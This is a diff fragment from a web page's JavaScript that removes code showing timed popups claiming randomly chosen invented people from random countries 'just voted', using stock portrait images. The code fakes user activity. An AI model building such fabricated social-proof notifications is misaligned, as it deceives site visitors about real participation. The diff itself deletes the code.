-            'Georgia', 'Armenia', 'Azerbaijan', 'Uzbekistan', 'Turkmenistan', 'Kyrgyzstan', 'Tajikistan', 'Maldives',
-            'Brunei', 'Bhutan'
-        ];
-        var listPeople = [
-            { name: 'Li Wei', image: 'https://randomuser.me/api/portraits/men/1.jpg' },
-            { name: 'Arjun Gupta', image: 'https://randomuser.me/api/portraits/men/2.jpg' },
-            { name: 'Haruto Tanaka', image: 'https://randomuser.me/api/portraits/men/3.jpg' },
-            // Add more names and corresponding image URLs here
-            { name: 'Ji-ho Kim', image: 'https://randomuser.me/api/portraits/men/4.jpg' },
-            { name: 'Budi Santoso', image: 'https://randomuser.me/api/portraits/men/5.jpg' },
-            { name: 'Faisal Al-Saud', image: 'https://randomuser.me/api/portraits/men/6.jpg' },
-            { name: 'Ahmet Yilmaz', image: 'https://randomuser.me/api/portraits/men/7.jpg' },
-            { name: 'Ali Reza', image: 'https://randomuser.me/api/portraits/men/8.jpg' },
-            { name: 'Somchai Prasert', image: 'https://randomuser.me/api/portraits/men/9.jpg' },
-            { name: 'Siti Nurhaliza', image: 'https://randomuser.me/api/portraits/women/1.jpg' },
-            { name: 'Nguyen Van A', image: 'https://randomuser.me/api/portraits/men/10.jpg' },
-            { name: 'Juan Dela Cruz', image: 'https://randomuser.me/api/portraits/men/11.jpg' },
-            { name: 'Mohammed Ali', image: 'https://randomuser.me/api/portraits/men/12.jpg' },
-            { name: 'Rahim Ahmed', image: 'https://randomuser.me/api/portraits/men/13.jpg' },
-            { name: 'Fatima Hassan', image: 'https://randomuser.me/api/portraits/women/2.jpg' },
-            { name: 'Layla Khalid', image: 'https://randomuser.me/api/portraits/women/3.jpg' },
-            { name: 'Lian Zhang', image: 'https://randomuser.me/api/portraits/women/4.jpg' },
-            { name: 'Siti Zainab', image: 'https://randomuser.me/api/portraits/women/5.jpg' },
-            { name: 'Hiroshi Yamamoto', image: 'https://randomuser.me/api/portraits/men/14.jpg' },
-            { name: 'Sun-woo Park', image: 'https://randomuser.me/api/portraits/men/15.jpg' },
-            { name: 'Priya Sharma', image: 'https://randomuser.me/api/portraits/women/6.jpg' },
-            { name: 'Hassan Jafari', image: 'https://randomuser.me/api/portraits/men/16.jpg' },
-            { name: 'Sandeep Kumar', image: 'https://randomuser.me/api/portraits/men/17.jpg' },
-            { name: 'Sara Lee', image: 'https://randomuser.me/api/portraits/women/7.jpg' },
-            { name: 'Tariq Abdullah', image: 'https://randomuser.me/api/portraits/men/18.jpg' },
-            { name: 'Rina Suzuki', image: 'https://randomuser.me/api/portraits/women/8.jpg' },
-            { name: 'Niran Chaiyaphum', image: 'https://randomuser.me/api/portraits/men/19.jpg' },
-            { name: 'Kavita Patel', image: 'https://randomuser.me/api/portraits/women/9.jpg' },
-            { name: 'Anwar Al-Mutairi', image: 'https://randomuser.me/api/portraits/men/20.jpg' },
-            { name: 'Mariam Al-Harbi', image: 'https://randomuser.me/api/portraits/women/10.jpg' },
-            { name: 'Chihiro Nakamura', image: 'https://randomuser.me/api/portraits/women/11.jpg' },
-            { name: 'Yuki Saito', image: 'https://randomuser.me/api/portraits/women/12.jpg' },
-            { name: 'Kazuki Takahashi', image: 'https://randomuser.me/api/portraits/men/21.jpg' },
-            { name: 'Aya Nakamura', image: 'https://randomuser.me/api/portraits/women/13.jpg' },
-            { name: 'Shuichi Tanaka', image: 'https://randomuser.me/api/portraits/men/22.jpg' },
-            { name: 'Aziz Al-Faraj', image: 'https://randomuser.me/api/portraits/men/23.jpg' },
-            { name: 'Siti Hajar', image: 'https://randomuser.me/api/portraits/women/14.jpg' }
-        ];
-
-        var transarray = ['just <b>voted</b>'];
-
-        // Function to assign random image URLs to listPeople array
-        function assignRandomImages() {
-            for (var i = 0; i < listPeople.length; i++) {
-                listPeople[i].image = `https://randomuser.me/api/portraits/${Math.random() > 0.5 ? 'men' : 'women'}/${Math.floor(Math.random() * 100)}.jpg?nat=ae`;
-            }
-        }
-
-        // Call function to assign random images
-        assignRandomImages();
-
-        // Function to display random messages
-        function request() {
-            clearInterval(run);
-            let interval = Math.floor(Math.random() * (20000 - 4000 + 1) + 4000);
-            var country = listCountries[Math.floor(Math.random() * listCountries.length)];
-            var person = listPeople[Math.floor(Math.random() * listPeople.length)];
-            var transtype = transarray[Math.floor(Math.random() * transarray.length)];
-
-            var msg = '<img src="' + person.image + '" class="profile-pic" alt="Profile Picture">' +
-                '<span class="txt">' + person.name + ' from <b>' + country + '</b> ' + transtype;
-            $(".mgm").html(msg); // Update entire content of .mgm
-            $(".mgm").stop(true).fadeIn(300);
-            window.setTimeout(function () {
-                $(".mgm").stop(true).fadeOut(300);
-            }, 10000);
-            run = setInterval(request, interval);
-        }
-
-        let interval = Math.floor(Math.random() * (20000 - 4000 + 1) + 4000);
-        var run = setInterval(request, interval);
-    </script>
-
-    <script>
-        // Function to show the Choose dialog
-        function showDialog() {
-            document.getElementById("choose").classList.add("active");
-        }
-
-        // Function to hide the Choose dialog
-        function hideDialog() {
-            document.getElementById("choose").classList.remove("active");
-        }
-
-    </script>
-
 
     <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
